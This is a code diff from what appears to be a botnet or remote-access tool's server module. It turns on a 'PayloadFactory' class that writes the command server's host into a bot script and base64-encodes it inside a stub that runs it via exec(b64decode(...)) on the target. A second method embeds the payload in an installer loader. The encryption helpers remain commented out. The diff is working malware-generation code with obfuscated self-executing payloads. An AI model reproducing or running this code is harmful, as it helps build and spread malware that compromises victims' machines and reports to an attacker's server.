@@ -1,6 +1,7 @@
 from base64 import b64encode
 from threading import RLock
 from os import path
+from textwrap import dedent
 import json
 import sqlite3
 
@@ -317,129 +318,129 @@ class Model:
             return tuple_list
 
 
-# class PayloadFactory:
-#     """Builds encrypted payloads which can only be run on the specified bot."""
+class PayloadFactory:
+    """Builds encrypted payloads which can only be run on the specified bot."""
 
-#     def __init__(self):
-#         pass
+    def __init__(self):
+        pass
 
-#     @staticmethod
-#     def create_payload(bot_uid, payload_options, loader_options):
-#         """:return: The configured and encrypted payload.
+    @staticmethod
+    def create_payload(bot_uid, payload_options, loader_options):
+        """:return: The configured and encrypted payload.
 
-#         :type bot_uid: str
-#         :type payload_options: dict
-#         :type loader_options: dict
-#         :rtype: str
-#         """
-#         # Configure bot.py
-#         with open(path.realpath(path.join(path.dirname(__file__), path.pardir, "bot", "bot.py"))) as input_file:
-#             configured_payload = ""
+        :type bot_uid: str
+        :type payload_options: dict
+        :type loader_options: dict
+        :rtype: str
+        """
+        # Configure bot.py
+        with open(path.realpath(path.join(path.dirname(__file__), path.pardir, "bot", "bot.py"))) as input_file:
+            configured_payload = ""
 
-#             server_host = payload_options["host"]
-#             server_port = payload_options["port"]
-#             program_directory = loader_options["program_directory"]
+            server_host = payload_options["host"]
+            # server_port = payload_options["port"]
+            program_directory = loader_options["program_directory"]
 
-#             for line in input_file:
-#                 if line.startswith("SERVER_HOST = "):
-#                     configured_payload += "SERVER_HOST = \"{}\"\n".format(server_host)
-#                 elif line.startswith("SERVER_PORT = "):
-#                     configured_payload += "SERVER_PORT = {}\n".format(server_port)
-#                 elif line.startswith("PROGRAM_DIRECTORY = "):
-#                     configured_payload += "PROGRAM_DIRECTORY = os.path.expanduser(\"{}\")\n".format(program_directory)
-#                 elif line.startswith("LOADER_OPTIONS = "):
-#                     configured_payload += "LOADER_OPTIONS = {}\n".format(str(loader_options))
-#                 else:
-#                     configured_payload += line
+            for line in input_file:
+                if line.startswith("SERVER_HOST = "):
+                    configured_payload += "SERVER_HOST = \"{}\"\n".format(server_host)
+                # elif line.startswith("SERVER_PORT = "):
+                #     configured_payload += "SERVER_PORT = {}\n".format(server_port)
+                elif line.startswith("PROGRAM_DIRECTORY = "):
+                    configured_payload += "PROGRAM_DIRECTORY = os.path.expanduser(\"{}\")\n".format(program_directory)
+                elif line.startswith("LOADER_OPTIONS = "):
+                    configured_payload += "LOADER_OPTIONS = {}\n".format(str(loader_options))
+                else:
+                    configured_payload += line
 
-#         # Encrypt the payload using the bot's unique key
-#         return dedent("""\
-#         #!/usr/bin/env python
-#         # -*- coding: utf-8 -*-
-#         import os
-#         import getpass
-#         from base64 import b64decode
-#         import uuid
+        # Encrypt the payload using the bot's unique key
+        return dedent("""\
+        #!/usr/bin/env python
+        # -*- coding: utf-8 -*-
+        import os
+        import getpass
+        from base64 import b64decode
+        import uuid
         
-#         def get_uid():
-#             return "".join(x.encode("hex") for x in (getpass.getuser() + "-" + str(uuid.getnode())))
+        def get_uid():
+            return "".join(x.encode("hex") for x in (getpass.getuser() + "-" + str(uuid.getnode())))
         
-#         exec(b64decode({}).decode())
-#         """.format(b64encode(configured_payload.encode())))
+        exec(b64decode({}).decode())
+        """.format(b64encode(configured_payload.encode())))
 
-#     @staticmethod
-#     def wrap_loader(loader_name, loader_options, payload):
-#         """:return: The loader which will load the (configured and encrypted) payload.
+    @staticmethod
+    def wrap_loader(loader_name, loader_options, payload):
+        """:return: The loader which will load the (configured and encrypted) payload.
 
-#         :type loader_name: str
-#         :type loader_options: dict
-#         :type payload: str
-#         :rtype: str
-#         """
-#         loader_path = path.realpath(path.join(
-#             path.dirname(__file__), path.pardir, "bot", "loaders", loader_name, "install.py")
-#         )
-#         loader = ""
+        :type loader_name: str
+        :type loader_options: dict
+        :type payload: str
+        :rtype: str
+        """
+        loader_path = path.realpath(path.join(
+            path.dirname(__file__), path.pardir, "bot", "loaders", loader_name, "install.py")
+        )
+        loader = ""
 
-#         with open(loader_path, "r") as input_file:
-#             for line in input_file:
-#                 if line.startswith("LOADER_OPTIONS = "):
-#                     loader += "LOADER_OPTIONS = {}\n".format(str(loader_options))
-#                 elif line.startswith("PAYLOAD_BASE64 = "):
-#                     loader += "PAYLOAD_BASE64 = \"{}\"\n".format(b64encode(payload.encode()).decode())
-#                 else:
-#                     loader += line
+        with open(loader_path, "r") as input_file:
+            for line in input_file:
+                if line.startswith("LOADER_OPTIONS = "):
+                    loader += "LOADER_OPTIONS = {}\n".format(str(loader_options))
+                elif line.startswith("PAYLOAD_BASE64 = "):
+                    loader += "PAYLOAD_BASE64 = \"{}\"\n".format(b64encode(payload.encode()).decode())
+                else:
+                    loader += line
 
-#         return loader
+        return loader
 
-#     @staticmethod
-#     def _openssl_encrypt(password, plaintext):
-#         """
-#         :type password: str
-#         :type plaintext: str
-#         :rtype: str
-#         """
-#         # Thanks to Joe Linoff, taken from https://stackoverflow.com/a/42773185
-#         salt = get_random_bytes(8)
-#         key, iv = PayloadFactory._get_key_and_iv(password, salt)
+    # @staticmethod
+    # def _openssl_encrypt(password, plaintext):
+    #     """
+    #     :type password: str
+    #     :type plaintext: str
+    #     :rtype: str
+    #     """
+    #     # Thanks to Joe Linoff, taken from https://stackoverflow.com/a/42773185
+    #     salt = get_random_bytes(8)
+    #     key, iv = PayloadFactory._get_key_and_iv(password, salt)
 
-#         # PKCS#7 padding
-#         padding_len = 16 - (len(plaintext) % 16)
-#         padded_plaintext = plaintext + (chr(padding_len) * padding_len)
+    #     # PKCS#7 padding
+    #     padding_len = 16 - (len(plaintext) % 16)
+    #     padded_plaintext = plaintext + (chr(padding_len) * padding_len)
 
-#         # Encrypt
-#         cipher = AES.new(key, AES.MODE_CBC, iv)
-#         cipher_text = cipher.encrypt(padded_plaintext.encode())
+    #     # Encrypt
+    #     cipher = AES.new(key, AES.MODE_CBC, iv)
+    #     cipher_text = cipher.encrypt(padded_plaintext.encode())
 
-#         # Make OpenSSL compatible
-#         openssl_cipher_text = b"Salted__" + salt + cipher_text
-#         return b64encode(openssl_cipher_text).decode()
+    #     # Make OpenSSL compatible
+    #     openssl_cipher_text = b"Salted__" + salt + cipher_text
+    #     return b64encode(openssl_cipher_text).decode()
 
-#     @staticmethod
-#     def _get_key_and_iv(password, salt, key_length = 32, iv_length = 16):
-#         """
-#         :type password: str
-#         :type salt: bytes
-#         :type key_length: int
-#         :type iv_length: int
-#         :rtype: tuple
-#         """
-#         password = password.encode()
+    # @staticmethod
+    # def _get_key_and_iv(password, salt, key_length = 32, iv_length = 16):
+    #     """
+    #     :type password: str
+    #     :type salt: bytes
+    #     :type key_length: int
+    #     :type iv_length: int
+    #     :rtype: tuple
+    #     """
+    #     password = password.encode()
 
-#         try:
-#             max_length = key_length + iv_length
-#             key_iv = MD5.new(password + salt).digest()
-#             tmp = [key_iv]
+    #     try:
+    #         max_length = key_length + iv_length
+    #         key_iv = MD5.new(password + salt).digest()
+    #         tmp = [key_iv]
 
-#             while len(tmp) < max_length:
-#                 tmp.append(MD5.new(tmp[-1] + password + salt).digest())
-#                 key_iv += tmp[-1]  # Append the last byte
+    #         while len(tmp) < max_length:
+    #             tmp.append(MD5.new(tmp[-1] + password + salt).digest())
+    #             key_iv += tmp[-1]  # Append the last byte
 
-#             key = key_iv[:key_length]
-#             iv = key_iv[key_length:key_length + iv_length]
-#             return key, iv
-#         except UnicodeDecodeError:
-#             return None, None
+    #         key = key_iv[:key_length]
+    #         iv = key_iv[key_length:key_length + iv_length]
+    #         return key, iv
+    #     except UnicodeDecodeError:
+    #         return None, None
 
 if __name__=="__main__":
     pass
